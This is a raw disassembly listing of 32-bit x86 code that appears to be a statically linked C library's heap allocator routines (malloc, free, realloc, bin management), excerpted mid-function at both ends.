leave
ret
mov dword [0x80aa360], 0
jmp 0x8050645
mov dword [ebx + edx*8 + 0x14], 0
mov dword [ebx + edx*8 + 0x10], 0
jmp 0x805058e
mov dword [0x80aa360], 1
jmp 0x8050538
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 4
mov dword [0x80aa83c], 1
mov edi, dword [arg_8h]
call fcn.0804f290
cmp dword [edi], 0x444c4541
jne 0x80509aa
test dword [edi + 4], 0xffffff00
jg 0x80509a0
mov eax, 0
test eax, eax
je 0x8050991
mov dword [esp], 0x80aa360
call section.
mov eax, dword [0x80aa388]
xor ebx, ebx
and eax, 2
or eax, 0x49
mov dword [0x80aa388], eax
mov dword [ebx*4 + 0x80aa38c], 0
inc ebx
cmp ebx, 9
jbe 0x80506df
xor ebx, ebx
mov dword [ebx*4 + 0x80aa7bc], 0
inc ebx
cmp ebx, 3
jbe 0x80506f2
mov eax, dword [edi + 0x10]
mov ebx, 1
mov dword [0x80aa3b8], 0
mov dword [0x80aa3b4], eax
lea esi, [esi]
mov esi, dword [edi + ebx*8 + 0x10]
lea edx, [ebx*8 + 0x80aa3b4]
test esi, esi
jne 0x8050859
mov dword [edx + 0xc], edx
mov dword [edx + 8], edx
inc ebx
cmp ebx, 0x7f
jbe 0x8050720
mov eax, dword [edi + 0x410]
mov dword [0x80aa808], eax
mov eax, dword [edi + 0x414]
mov dword [0x80aa7d0], eax
mov eax, dword [edi + 0x418]
mov dword [0x80aa7e0], eax
mov ebx, dword [edi + 4]
mov eax, dword [edi + 0x41c]
mov dword [0x80aa7e4], eax
test ebx, ebx
mov eax, dword [edi + 0x420]
mov dword [0x80aa7f0], eax
mov eax, dword [edi + 0x424]
mov dword [0x80aa7e8], eax
mov eax, dword [edi + 0x428]
mov dword [0x80a951c], eax
mov eax, dword [edi + 0x42c]
mov dword [0x80aa7d4], eax
mov eax, dword [edi + 0x434]
mov dword [0x80aa7ec], eax
mov eax, dword [edi + 0x438]
mov dword [0x80aa7f4], eax
mov eax, dword [edi + 0x43c]
mov dword [0x80aa7fc], eax
mov eax, dword [edi + 0x440]
mov dword [0x80aa800], eax
jle 0x8050827
mov eax, dword [edi + 0x444]
test eax, eax
je 0x80507ec
mov ecx, dword [0x80aa838]
test ecx, ecx
jne 0x80507e8
mov edx, dword [0x80aa83c]
test edx, edx
je 0x8050852
test eax, eax
jne 0x8050827
mov eax, dword [0x80aa838]
test eax, eax
je 0x8050827
mov dword [0x80a950c], 0
mov dword [0x80aa344], 0
mov dword [0x80a9510], 0
mov dword [0x80a9514], 0
mov dword [0x80aa838], 0
mov eax, 0
test eax, eax
je 0x8050846
mov dword [esp], 0x80aa360
call section.
xor eax, eax
add esp, 4
pop ebx
pop esi
pop edi
leave
ret
mov dword [0x80aa360], 0
jmp 0x805083c
call fcn.0804fc60
jmp 0x8050827
cmp ebx, 0x3f
jbe 0x80508d0
mov ecx, dword [esi + 4]
and ecx, 0xfffffff8
mov eax, ecx
shr eax, 6
cmp eax, 0x20
ja 0x8050941
add eax, 0x38
cmp eax, ebx
je 0x80508b0
mov dword [edx + 8], edx
mov dword [edx + 0xc], edx
mov eax, dword [edi + ebx*8 + 0x10]
mov dword [eax + 0xc], 0x80aa3bc
mov eax, dword [0x80aa3c4]
mov edx, dword [edi + ebx*8 + 0x14]
mov dword [edx + 8], eax
mov eax, dword [0x80aa3c4]
mov edx, dword [edi + ebx*8 + 0x14]
mov dword [eax + 0xc], edx
mov eax, dword [edi + ebx*8 + 0x10]
mov dword [0x80aa3c4], eax
jmp 0x8050739
mov eax, dword [edi + ebx*8 + 0x14]
mov ecx, dword [eax + 4]
and ecx, 0xfffffff8
mov eax, ecx
shr eax, 6
cmp eax, 0x20
ja 0x8050900
add eax, 0x38
cmp eax, ebx
jne 0x8050879
nop
lea esi, [esi]
mov dword [edx + 8], esi
mov ecx, ebx
mov eax, dword [edi + ebx*8 + 0x14]
and ecx, 0x1f
mov dword [edx + 0xc], eax
mov dword [esi + 0xc], edx
mov eax, dword [edx + 0xc]
mov dword [eax + 8], edx
mov eax, 1
mov edx, ebx
shr edx, 5
shl eax, cl
or dword [edx*4 + 0x80aa7bc], eax
jmp 0x8050739
mov eax, ecx
shr eax, 9
cmp eax, 0x14
ja 0x805090f
add eax, 0x5b
jmp 0x80508c7
mov eax, ecx
shr eax, 0xc
cmp eax, 0xa
ja 0x805091e
add eax, 0x6e
jmp 0x80508c7
mov eax, ecx
shr eax, 0xf
cmp eax, 4
ja 0x805092d
add eax, 0x77
jmp 0x80508c7
mov eax, ecx
shr eax, 0x12
cmp eax, 2
ja 0x805093c
add eax, 0x7c
jmp 0x80508c7
cmp ebx, 0x7e
jmp 0x80508c9
mov eax, ecx
shr eax, 9
cmp eax, 0x14
ja 0x8050953
add eax, 0x5b
jmp 0x8050875
mov eax, ecx
shr eax, 0xc
cmp eax, 0xa
ja 0x8050965
add eax, 0x6e
jmp 0x8050875
mov eax, ecx
shr eax, 0xf
cmp eax, 4
ja 0x8050977
add eax, 0x77
jmp 0x8050875
mov eax, ecx
shr eax, 0x12
cmp eax, 2
ja 0x8050989
add eax, 0x7c
jmp 0x8050875
cmp ebx, 0x7e
jmp 0x8050877
mov dword [0x80aa360], 1
jmp 0x80506cd
mov eax, 0xfffffffe
jmp 0x805083e
mov eax, 0xffffffff
jmp 0x805083e
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
mov eax, dword [0x80a9518]
mov edi, dword [arg_8h]
test eax, eax
js 0x8051659
mov eax, 0
test eax, eax
je 0x805164e
mov dword [esp], 0
call section.
mov esi, eax
test esi, esi
mov ebx, esi
je 0x8051627
mov eax, 0
test eax, eax
je 0x8051640
mov dword [esp], esi
call section.
test eax, eax
jne 0x8051627
nop
xor eax, eax
test ebx, ebx
je 0x8051617
mov dword [var_4h], edi
mov dword [esp], ebx
call fcn.08052d30
mov esi, eax
mov eax, 0
test eax, eax
je 0x805161f
mov dword [esp], ebx
call section.
mov eax, esi
add esp, 8
pop ebx
pop esi
pop edi
leave
ret
mov dword [ebx], 0
jmp 0x8051615
mov edx, edi
mov eax, esi
add edx, dword [0x80aa7f8]
add edx, 0x10
call fcn.0804f920
mov ebx, eax
jmp 0x80515f0
lea esi, [esi]
mov eax, dword [esi]
test eax, eax
jne 0x8051627
mov dword [esi], 1
jmp 0x80515f0
mov esi, dword [0x80aa34c]
jmp 0x80515d4
call fcn.0804f290
jmp 0x80515b9
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
mov eax, dword [0x80a9518]
mov edi, dword [arg_8h]
test eax, eax
js 0x805171c
mov eax, 0
test eax, eax
je 0x8051714
mov dword [esp], 0
call section.
mov esi, eax
test esi, esi
mov ebx, esi
je 0x80516f1
mov eax, 0
test eax, eax
je 0x8051706
mov dword [esp], esi
call section.
test eax, eax
jne 0x80516f1
nop
mov dword [var_4h], edi
mov dword [esp], ebx
call fcn.08052d70
mov esi, eax
mov eax, 0
test eax, eax
je 0x80516e9
mov dword [esp], ebx
call section.
add esp, 8
mov eax, esi
pop ebx
pop esi
pop edi
leave
ret
mov dword [ebx], 0
jmp 0x80516df
mov edx, dword [0x80aa7f8]
mov eax, esi
lea edx, [edi + edx*2 + 0x10]
call fcn.0804f920
mov ebx, eax
jmp 0x80516c0
mov eax, dword [esi]
test eax, eax
jne 0x80516f1
mov dword [esi], 1
jmp 0x80516c0
mov esi, dword [0x80aa34c]
jmp 0x80516a4
call fcn.0804f290
jmp 0x8051689
push ebp
mov ebp, esp
leave
jmp loc.08052df0
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
test eax, eax
je 0x8052e1b
lea edx, [eax - 8]
mov eax, dword [edx + 4]
test al, 2
je 0x8052e0c
and eax, 0xfffffff8
sub eax, 8
leave
ret
and eax, 0xfffffff8
test byte [eax + edx + 4], 1
je 0x8052e1b
sub eax, 4
jmp 0x8052e0a
xor eax, eax
jmp 0x8052e0a
push ebp
mov ebp, esp
leave
jmp 0x8052f60
lea esi, [esi]
push ebp
mov ebp, esp
push ebx
sub esp, 0x38
mov eax, dword [0x80a9518]
mov ebx, dword [arg_8h]
test eax, eax
js 0x8051ccf
mov eax, 0
test eax, eax
je 0x8051cc0
mov dword [esp], 0x80aa360
call section.
lea eax, [var_34h]
mov dword [var_4h], 0x80aa360
mov dword [esp], eax
call fcn.08052e20
mov eax, 0
sub esp, 4
test eax, eax
je 0x8051caf
mov dword [esp], 0x80aa360
call section.
mov eax, dword [var_34h]
mov dword [ebx], eax
mov eax, dword [var_30h]
mov dword [ebx + 4], eax
mov eax, dword [var_2ch]
mov dword [ebx + 8], eax
mov eax, dword [var_28h]
mov dword [ebx + 0xc], eax
mov eax, dword [var_24h]
mov dword [ebx + 0x10], eax
mov eax, dword [var_20h]
mov dword [ebx + 0x14], eax
mov eax, dword [var_1ch]
mov dword [ebx + 0x18], eax
mov eax, dword [var_18h]
mov dword [ebx + 0x1c], eax
mov eax, dword [var_14h]
mov dword [ebx + 0x20], eax
mov eax, dword [var_10h]
mov dword [ebx + 0x24], eax
mov eax, ebx
mov ebx, dword [var_bp_4h]
leave
ret 4
mov dword [0x80aa360], 0
jmp 0x8051c6b
nop
lea esi, [esi]
mov dword [0x80aa360], 1
jmp 0x8051c40
call fcn.0804f290
jmp 0x8051c27
lea esi, [esi]
push ebp
mov ebp, esp
leave
jmp fcn.08053120
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov eax, dword [arg_8h]
mov dword [var_10h], eax
mov eax, dword [arg_ch]
cmp eax, 0xffffffdf
ja 0x8052208
add eax, 0xb
mov dword [var_14h], 0x10
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
cmovb edx, dword [var_14h]
mov dword [var_14h], edx
mov edx, dword [var_10h]
mov ecx, dword [edx + 0x28]
cmp dword [var_14h], ecx
ja 0x8051d55
mov eax, dword [var_14h]
shr eax, 1
add edx, eax
mov eax, dword [edx + 0x24]
test eax, eax
mov dword [var_1ch], eax
je 0x8051d55
mov ecx, eax
mov eax, dword [eax + 8]
mov dword [edx + 0x24], eax
mov eax, ecx
add eax, 8
add esp, 0x24
pop ebx
pop esi
pop edi
leave
ret
cmp dword [var_14h], 0x1ff
ja 0x8052197
mov eax, dword [var_14h]
mov edx, dword [var_10h]
shr eax, 3
lea ebx, [edx + eax*8 + 0x54]
mov dword [var_18h], eax
mov ecx, dword [ebx + 0xc]
cmp ecx, ebx
mov dword [var_1ch], ecx
je 0x8051db1
test ecx, ecx
je 0x8051da9
mov edx, dword [var_1ch]
mov ecx, dword [var_14h]
mov eax, dword [var_1ch]
or dword [ecx + edx + 4], 1
mov eax, dword [eax + 0xc]
mov dword [ebx + 0xc], eax
mov dword [eax + 8], ebx
cmp dword [var_10h], 0x80aa360
je 0x8051da4
or dword [edx + 4], 4
mov eax, dword [var_1ch]
jmp 0x8051d4a
mov dword [esp], edx
call fcn.08052430
mov edx, dword [var_10h]
mov ecx, dword [var_14h]
add edx, 0x5c
or ecx, 1
mov dword [var_24h], edx
mov dword [var_20h], ecx
mov eax, dword [var_10h]
mov edx, dword [var_24h]
mov eax, dword [eax + 0x68]
cmp eax, edx
mov dword [var_1ch], eax
je 0x8051e71
mov eax, dword [var_1ch]
mov ecx, dword [var_1ch]
mov edi, dword [eax + 4]
mov ecx, dword [ecx + 0xc]
and edi, 0xfffffff8
mov dword [var_28h], ecx
cmp dword [var_14h], 0x1ff
ja 0x8051dfd
mov edx, dword [var_24h]
cmp ecx, edx
je 0x8052164
cmp edi, dword [var_14h]
mov ecx, dword [var_28h]
mov edx, dword [var_10h]
mov eax, dword [var_24h]
mov dword [edx + 0x68], ecx
mov dword [ecx + 8], eax
je 0x8052154
cmp edi, 0x1ff
ja 0x80520ce
mov eax, dword [var_10h]
mov esi, edi
shr esi, 3
lea eax, [eax + esi*8 + 0x54]
mov ebx, dword [eax + 8]
mov dword [var_28h], eax
mov edx, esi
mov eax, 1
and esi, 0x1f
mov ecx, esi
sar edx, 5
shl eax, cl
mov ecx, dword [var_10h]
or dword [ecx + edx*4 + 0x45c], eax
mov eax, dword [var_1ch]
mov edx, dword [var_28h]
mov dword [eax + 8], ebx
mov dword [eax + 0xc], edx
mov dword [edx + 8], eax
mov dword [ebx + 0xc], eax
mov eax, dword [var_24h]
mov ecx, dword [ecx + 0x68]
cmp ecx, eax
mov dword [var_1ch], ecx
jne 0x8051dd7
cmp dword [var_14h], 0x1ff
jbe 0x8051e9d
mov edx, dword [var_18h]
mov ecx, dword [var_10h]
lea ebx, [ecx + edx*8 + 0x54]
mov eax, dword [ebx + 0xc]
cmp eax, ebx
mov dword [var_1ch], eax
je 0x8051e9d
mov eax, dword [ebx + 8]
mov edx, dword [var_14h]
cmp dword [eax + 4], edx
jae 0x8052043
inc dword [var_18h]
mov ecx, dword [var_10h]
mov esi, 1
mov edx, dword [var_18h]
and dword [var_18h], 0x1f
lea ebx, [ecx + edx*8 + 0x54]
shr edx, 5
mov eax, dword [ecx + edx*4 + 0x45c]
movzx ecx, byte [var_18h]
mov dword [var_28h], eax
mov eax, edx
shl esi, cl
shl eax, 8
mov ecx, dword [var_10h]
lea edi, [ecx + eax]
cmp esi, dword [var_28h]
ja 0x8051ee0
test esi, esi
jne 0x8051f09
lea esi, [esi]
inc edx
add edi, 0x100
cmp edx, 3
ja 0x8051fc5
mov eax, dword [var_10h]
mov eax, dword [eax + edx*4 + 0x45c]
test eax, eax
mov dword [var_28h], eax
je 0x8051ee0
lea ebx, [edi + 0x54]
mov esi, 1
test dword [var_28h], esi
jne 0x8051f1a
mov esi, esi
add ebx, 8
add esi, esi
test dword [var_28h], esi
je 0x8051f10
mov ecx, dword [ebx + 0xc]
cmp ecx, ebx
mov dword [var_1ch], ecx
jne 0x8051f42
mov eax, esi
mov ebx, dword [var_1ch]
add esi, esi
not eax
and dword [var_28h], eax
mov eax, dword [var_10h]
mov ecx, dword [var_28h]
add ebx, 8
mov dword [eax + edx*4 + 0x45c], ecx
jmp 0x8051ed1
mov eax, dword [var_1ch]
mov edi, dword [eax + 4]
mov edx, dword [eax + 0xc]
and edi, 0xfffffff8
mov dword [ebx + 0xc], edx
mov dword [edx + 8], ebx
mov esi, edi
sub esi, dword [var_14h]
cmp esi, 0xf
ja 0x8051f79
or dword [edi + eax + 4], 1
cmp dword [var_10h], 0x80aa360
je 0x8051da4
or dword [eax + 4], 4
jmp 0x8051da4
mov edx, dword [var_1ch]
mov ecx, dword [var_10h]
add edx, dword [var_14h]
mov eax, dword [var_24h]
cmp dword [var_14h], 0x1ff
mov dword [ecx + 0x64], edx
mov dword [ecx + 0x68], edx
mov dword [edx + 8], eax
mov dword [edx + 0xc], eax
ja 0x8051f9d
mov dword [ecx + 0x58], edx
or dword [var_14h], 5
cmp dword [var_10h], 0x80aa360
mov ecx, dword [var_20h]
mov eax, dword [var_1ch]
mov dword [esi + edx], esi
cmovne ecx, dword [var_14h]
mov dword [eax + 4], ecx
mov eax, esi
or eax, 1
mov dword [edx + 4], eax
jmp 0x8051da4
mov edx, dword [var_10h]
mov eax, dword [var_14h]
mov edx, dword [edx + 0x54]
add eax, 0x10
mov edi, dword [edx + 4]
mov dword [var_1ch], edx
and edi, 0xfffffff8
cmp edi, eax
jae 0x8052015
mov eax, dword [var_10h]
test byte [eax + 0x28], 1
jne 0x8051ffd
mov dword [esp], eax
call fcn.08052430
mov edx, dword [var_14h]
shr edx, 3
mov dword [var_18h], edx
jmp 0x8051dc3
mov ecx, dword [var_10h]
mov eax, dword [var_14h]
mov dword [arg_ch], ecx
mov dword [arg_8h], eax
add esp, 0x24
pop ebx
pop esi
pop edi
leave
jmp 0x80509c0
add edx, dword [var_14h]
mov ecx, dword [var_10h]
sub edi, dword [var_14h]
mov eax, dword [var_20h]
or dword [var_14h], 5
cmp ecx, 0x80aa360
cmovne eax, dword [var_14h]
mov dword [ecx + 0x54], edx
mov ecx, dword [var_1ch]
or edi, 1
mov dword [ecx + 4], eax
mov dword [edx + 4], edi
jmp 0x8051d48
mov ecx, dword [var_1ch]
mov edi, dword [ecx + 4]
and edi, 0xfffffff8
cmp edi, edx
jae 0x8052064
mov eax, dword [var_1ch]
mov eax, dword [eax + 0xc]
mov edi, dword [eax + 4]
mov dword [var_1ch], eax
and edi, 0xfffffff8
cmp edi, dword [var_14h]
jb 0x8052050
mov edx, dword [var_1ch]
mov esi, edi
sub esi, dword [var_14h]
mov ebx, dword [edx + 8]
mov ecx, dword [edx + 0xc]
cmp dword [ebx + 0xc], edx
mov dword [var_28h], ecx
jne 0x805207f
cmp dword [ecx + 8], edx
je 0x805208c
hlt
mov dword [esp], 0x7f
call fcn.08053d90
mov eax, dword [var_28h]
cmp esi, 0xf
mov dword [ebx + 0xc], eax
mov dword [eax + 8], ebx
ja 0x80520a7
mov edx, dword [var_1ch]
or dword [edi + edx + 4], 1
jmp 0x8051d97
mov edx, dword [var_1ch]
mov ecx, dword [var_10h]
add edx, dword [var_14h]
mov dword [ecx + 0x64], edx
mov dword [ecx + 0x68], edx
mov eax, dword [var_24h]
or dword [var_14h], 5
cmp ecx, 0x80aa360
mov dword [edx + 8], eax
mov dword [edx + 0xc], eax
jmp 0x8051fa8
mov eax, edi
shr eax, 6
cmp eax, 0x20
lea esi, [eax + 0x38]
jbe 0x8052115
mov eax, edi
shr eax, 9
cmp eax, 0x14
lea esi, [eax + 0x5b]
jbe 0x8052115
mov eax, edi
shr eax, 0xc
cmp eax, 0xa
lea esi, [eax + 0x6e]
jbe 0x8052115
mov eax, edi
shr eax, 0xf
cmp eax, 4
lea esi, [eax + 0x77]
jbe 0x8052115
mov eax, edi
mov esi, 0x7e
shr eax, 0x12
lea edx, [eax + 0x7c]
cmp eax, 2
cmovbe esi, edx
mov edx, dword [var_10h]
lea edx, [edx + esi*8 + 0x54]
mov ebx, dword [edx + 8]
mov dword [var_28h], edx
cmp ebx, edx
je 0x8051e33
mov eax, dword [edx + 0xc]
or edi, 1
cmp edi, dword [eax + 4]
ja 0x805213c
mov ebx, edx
jmp 0x8051e30
cmp edi, dword [ebx + 4]
jae 0x8052149
mov ebx, dword [ebx + 8]
cmp edi, dword [ebx + 4]
jb 0x8052141
mov ecx, dword [ebx + 0xc]
mov dword [var_28h], ecx
jmp 0x8051e33
mov edx, dword [var_1ch]
mov ecx, dword [var_14h]
or dword [ecx + edx + 4], 1
jmp 0x8051d97
mov ecx, dword [var_10h]
cmp eax, dword [ecx + 0x58]
jne 0x8051dfd
mov eax, dword [var_14h]
add eax, 0x10
cmp edi, eax
jbe 0x8051dfd
mov edx, dword [var_1ch]
mov esi, edi
add edx, dword [var_14h]
sub esi, dword [var_14h]
mov dword [ecx + 0x64], edx
mov dword [ecx + 0x68], edx
mov dword [ecx + 0x58], edx
jmp 0x80520b6
mov eax, dword [var_14h]
shr eax, 6
cmp eax, 0x20
ja 0x80521bc
add eax, 0x38
mov dword [var_18h], eax
and ecx, 1
jne 0x8051db1
mov eax, dword [var_10h]
mov dword [esp], eax
jmp 0x8051dac
mov eax, dword [var_14h]
shr eax, 9
cmp eax, 0x14
ja 0x80521cc
add eax, 0x5b
jmp 0x80521a5
mov eax, dword [var_14h]
shr eax, 0xc
cmp eax, 0xa
ja 0x80521dc
add eax, 0x6e
jmp 0x80521a5
mov eax, dword [var_14h]
shr eax, 0xf
cmp eax, 4
ja 0x80521ec
add eax, 0x77
jmp 0x80521a5
mov eax, dword [var_14h]
mov dword [var_18h], 0x7e
shr eax, 0x12
lea edx, [eax + 0x7c]
cmp eax, 2
cmova edx, dword [var_18h]
mov dword [var_18h], edx
jmp 0x80521a8
call fcn.08048b20
mov dword [eax], 0xc
xor eax, eax
jmp 0x8051d4d
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x24
mov dword [var_8h], esi
mov eax, dword [arg_8h]
mov dword [var_ch], ebx
mov esi, dword [arg_ch]
mov dword [var_4h], edi
mov dword [var_10h], eax
test esi, esi
je 0x8052272
lea ecx, [esi - 8]
mov edx, dword [ecx + 4]
mov ebx, edx
and ebx, 0xfffffff8
mov eax, ebx
neg eax
cmp ecx, eax
ja 0x80523dd
mov edi, dword [var_10h_2]
mov eax, dword [edi + 0x28]
cmp ebx, eax
ja 0x8052280
shr ebx, 3
and eax, 0xfffffffe
lea edx, [edi + ebx*4]
mov dword [edi + 0x28], eax
mov eax, dword [edx + 0x24]
mov dword [ecx + 8], eax
mov dword [edx + 0x24], ecx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea esi, [esi]
test dl, 2
jne 0x80523b4
lea edi, [ebx + ecx]
mov eax, dword [edi + 4]
mov dword [var_18h], eax
and eax, 0xfffffff8
and edx, 1
mov dword [var_14h], eax
jne 0x80522c7
mov eax, dword [esi - 8]
sub ecx, eax
add ebx, eax
mov edx, dword [ecx + 8]
mov eax, dword [ecx + 0xc]
cmp dword [edx + 0xc], ecx
jne 0x80522b4
cmp dword [eax + 8], ecx
je 0x80522c1
hlt
mov dword [esp], 0x7f
call fcn.08053d90
mov dword [edx + 0xc], eax
mov dword [eax + 8], edx
mov edx, dword [var_10h_2]
cmp edi, dword [edx + 0x54]
je 0x80523a6
mov eax, dword [var_10h_2]
test byte [eax + edi + 4], 1
jne 0x8052397
mov edx, dword [edi + 8]
mov eax, dword [edi + 0xc]
cmp dword [edx + 0xc], edi
jne 0x80522b4
cmp dword [eax + 8], edi
jne 0x80522b4
add ebx, dword [var_10h_2]
mov dword [edx + 0xc], eax
mov dword [eax + 8], edx
mov eax, dword [var_ch_2]
mov dword [ebx + ecx], ebx
add eax, 0x5c
mov edx, dword [eax + 8]
mov dword [ecx + 0xc], eax
mov dword [ecx + 8], edx
mov dword [edx + 0xc], ecx
mov dword [eax + 8], ecx
mov eax, ebx
or eax, 1
mov dword [ecx + 4], eax
cmp ebx, 0xffff
jbe 0x8052272
mov eax, dword [var_10h_2]
test byte [eax + 0x28], 1
je 0x805238d
cmp dword [var_10h_2], 0x80aa360
je 0x8052358
mov edx, dword [var_ch_2]
mov ebx, dword [var_8h_2]
mov esi, dword [var_4h_2]
mov edi, dword [var_4h_3]
mov eax, dword [edx + 0x54]
mov edx, dword [0x80aa7e4]
leave
and eax, 0xfff00000
jmp 0x804f7c0
mov eax, dword [0x80aa3b4]
mov eax, dword [eax + 4]
and eax, 0xfffffff8
cmp eax, dword [0x80aa7e0]
jb 0x8052272
mov dword [var_sp_8h], 0x80aa360
mov ebx, dword [var_ch_2]
mov esi, dword [var_8h_2]
mov eax, dword [0x80aa7e4]
mov edi, dword [var_4h_2]
mov dword [var_sp_4h], eax
leave
jmp fcn.08050e70
mov dword [esp], eax
call fcn.08052430
jmp 0x805232f
and dword [var_14h], 0xfffffffe
mov edx, dword [var_14h]
mov dword [edi + 4], edx
jmp 0x80522fa
add ebx, dword [var_14h]
mov edi, dword [var_10h_2]
mov dword [edi + 0x54], ecx
jmp 0x8052312
mov edx, dword [esi - 8]
dec dword [0x80aa7ec]
lea eax, [edx + ebx]
sub ecx, edx
sub dword [0x80aa7fc], eax
mov ebx, dword [var_ch_2]
mov esi, dword [var_8h_2]
mov dword [var_sp_8h], eax
mov dword [var_sp_4h], ecx
mov edi, dword [var_4h_2]
leave
jmp fcn.08054780
mov eax, dword [0x80a951c]
test al, 1
jne 0x80523f0
test al, 2
je 0x8052272
jmp 0x8052424
mov edx, dword [0x80a9504]
mov ebx, dword [edx + 0x3c]
mov eax, ebx
or eax, 2
mov dword [edx + 0x3c], eax
mov dword [esp], edx
mov dword [var_sp_4h], str.free__:_invalid_pointer__p__n
mov dword [var_sp_8h], esi
call fcn.08049b80
mov eax, dword [0x80a9504]
or dword [eax + 0x3c], ebx
mov eax, dword [0x80a951c]
jmp 0x80523e6
call fcn.08062c50
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov eax, dword [var_sp_4h]
mov dword [var_10h_2], eax
mov edx, eax
mov eax, dword [eax + 0x28]
test eax, eax
je 0x8052551
mov ebx, dword [var_10h_2]
or eax, 1
mov dword [edx + 0x28], eax
shr eax, 3
add edx, 0x5c
mov dword [var_20h], edx
lea eax, [ebx + eax*4 + 0x24]
add ebx, 0x2c
mov dword [var_18h], eax
mov dword [var_14h], ebx
nop
lea esi, [esi]
mov eax, dword [var_14h]
mov ecx, dword [eax]
test ecx, ecx
je 0x805251c
mov dword [eax], 0
mov eax, dword [ecx + 4]
mov edx, dword [ecx + 8]
mov esi, eax
mov dword [var_1ch], edx
and esi, 0xfffffffa
lea edx, [esi + ecx]
mov edi, dword [edx + 4]
mov ebx, edi
and ebx, 0xfffffff8
test al, 1
mov dword [var_24h], ebx
jne 0x80524c7
mov eax, dword [ecx]
sub ecx, eax
add esi, eax
mov ebx, dword [ecx + 8]
mov eax, dword [ecx + 0xc]
cmp dword [ebx + 0xc], ecx
jne 0x8052563
cmp dword [eax + 8], ecx
jne 0x8052563
mov dword [ebx + 0xc], eax
mov dword [eax + 8], ebx
mov eax, dword [var_10h_2]
cmp edx, dword [eax + 0x54]
je 0x8052540
mov ebx, dword [var_24h]
test byte [ebx + edx + 4], 1
jne 0x8052534
add esi, ebx
mov eax, dword [edx + 0xc]
mov ebx, dword [edx + 8]
cmp dword [ebx + 0xc], edx
jne 0x8052563
cmp dword [eax + 8], edx
jne 0x8052563
mov dword [ebx + 0xc], eax
mov dword [eax + 8], ebx
mov eax, dword [var_20h]
mov ebx, dword [var_20h]
mov dword [esi + ecx], esi
mov edx, dword [eax + 8]
mov dword [eax + 8], ecx
mov eax, esi
or eax, 1
mov dword [ecx + 4], eax
mov dword [edx + 0xc], ecx
mov dword [ecx + 8], edx
mov dword [ecx + 0xc], ebx
mov ecx, dword [var_1ch]
test ecx, ecx
jne 0x8052483
mov eax, dword [var_14h]
add dword [var_14h], 4
cmp eax, dword [var_18h]
jne 0x8052470
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
and edi, 0xfffffffe
mov dword [edx + 4], edi
jmp 0x80524f1
lea esi, [esi]
add esi, dword [var_24h]
mov eax, dword [var_10h_2]
mov dword [eax + 0x54], ecx
or esi, 1
mov dword [ecx + 4], esi
jmp 0x8052511
mov edx, dword [var_10h_2]
mov dword [var_sp_4h], edx
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
jmp fcn.0804edc0
hlt
mov dword [esp], 0x7f
call fcn.08053d90
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov ebx, dword [arg_ch]
mov eax, dword [arg_8h]
mov dword [var_10h], eax
mov eax, dword [arg_10h]
test eax, eax
je 0x80528cc
test ebx, ebx
je 0x80528b7
cmp eax, 0xffffffdf
ja 0x80528a5
add eax, 0xb
mov dword [var_14h], 0x10
mov edx, eax
and edx, 0xfffffff8
cmp eax, 0x10
lea eax, [ebx - 8]
cmovb edx, dword [var_14h]
mov ecx, dword [eax + 4]
mov dword [var_18h], eax
mov dword [var_14h], edx
mov edx, ecx
and edx, 0xfffffff8
test cl, 2
mov dword [var_1ch], edx
jne 0x80527c5
mov eax, dword [var_14h]
mov edi, edx
cmp edx, eax
jae 0x8052630
mov esi, dword [var_18h]
add esi, edx
mov edx, dword [var_10h]
cmp esi, dword [edx + 0x54]
je 0x8052777
mov eax, dword [esi + 4]
and eax, 0xfffffff8
test byte [eax + esi + 4], 1
jne 0x80526c0
mov edi, dword [var_1ch]
add edi, eax
cmp edi, dword [var_14h]
jb 0x80526c0
mov edx, dword [esi + 8]
mov eax, dword [esi + 0xc]
cmp dword [edx + 0xc], esi
jne 0x805261a
cmp dword [eax + 8], esi
je 0x8052627
hlt
mov dword [esp], 0x7f
call fcn.08053d90
mov dword [edx + 0xc], eax
mov dword [eax + 8], edx
lea esi, [esi]
mov ebx, edi
sub ebx, dword [var_14h]
cmp ebx, 0xf
ja 0x8052669
mov eax, ecx
and eax, 7
or eax, edi
mov edx, eax
or edx, 4
cmp dword [var_10h], 0x80aa360
cmovne eax, edx
mov edx, dword [var_18h]
mov dword [edx + 4], eax
or dword [edi + edx + 4], 1
mov eax, dword [var_18h]
add eax, 8
add esp, 0x2c
pop ebx
pop esi
pop edi
leave
ret
mov eax, ecx
mov edx, dword [var_18h]
add edx, dword [var_14h]
and eax, 7
or eax, dword [var_14h]
mov ecx, eax
or ecx, 4
cmp dword [var_10h], 0x80aa360
cmovne eax, ecx
mov ecx, dword [var_18h]
mov dword [ecx + 4], eax
mov ecx, ebx
mov eax, ebx
or eax, 1
or ecx, 5
cmp dword [var_10h], 0x80aa360
cmovne eax, ecx
mov dword [edx + 4], eax
or dword [ebx + edx + 4], 1
add edx, 8
mov dword [var_4h], edx
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08052220
jmp 0x805265b
lea esi, [esi]
mov eax, dword [var_14h]
sub eax, 7
mov dword [var_4h], eax
mov ecx, dword [var_10h]
mov dword [esp], ecx
call fcn.08051cf0
mov dword [var_24h], eax
mov edx, dword [var_24h]
xor eax, eax
test edx, edx
je 0x8052661
mov eax, dword [var_24h]
sub eax, 8
mov edi, dword [eax + 4]
mov dword [var_20h], eax
and edi, 0xfffffff8
cmp eax, esi
je 0x8052769
mov ecx, dword [var_1ch]
sub ecx, 4
shr ecx, 2
cmp ecx, 9
jbe 0x8052721
cld
mov edi, dword [var_24h]
mov esi, ebx
rep movsd dword es:[edi], dword ptr [esi]
mov dword [var_4h], ebx
mov ecx, dword [var_10h]
mov dword [esp], ecx
call fcn.08052220
mov eax, dword [var_20h]
jmp 0x805265e
mov eax, dword [ebx]
mov edx, dword [var_24h]
cmp ecx, 4
mov dword [edx], eax
mov eax, dword [ebx + 4]
mov dword [edx + 4], eax
